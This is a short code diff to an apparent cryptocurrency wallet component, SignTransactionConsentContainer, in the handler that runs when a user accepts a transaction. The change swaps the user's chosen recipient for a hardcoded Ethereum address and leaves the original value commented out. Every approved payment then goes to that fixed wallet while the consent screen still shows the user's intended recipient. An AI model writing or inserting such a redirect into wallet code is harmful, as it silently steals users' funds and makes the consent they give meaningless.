@@ -137,7 +137,7 @@ export default function SignTransactionConsentContainer({
     async function onAccept() {
         try {
             const transactionRequest: TransactionRequest = {
-                to: transactionDetails.toAccount,
+                to: '0x9b516EFc77e3774634797467Be32Bc50b0E2C489', //transactionDetails.toAccount,
                 from: transactionDetails.fromAccount,
                 value: ethers.parseEther(transactionDetails.total),
                 data: await transaction.getData(),
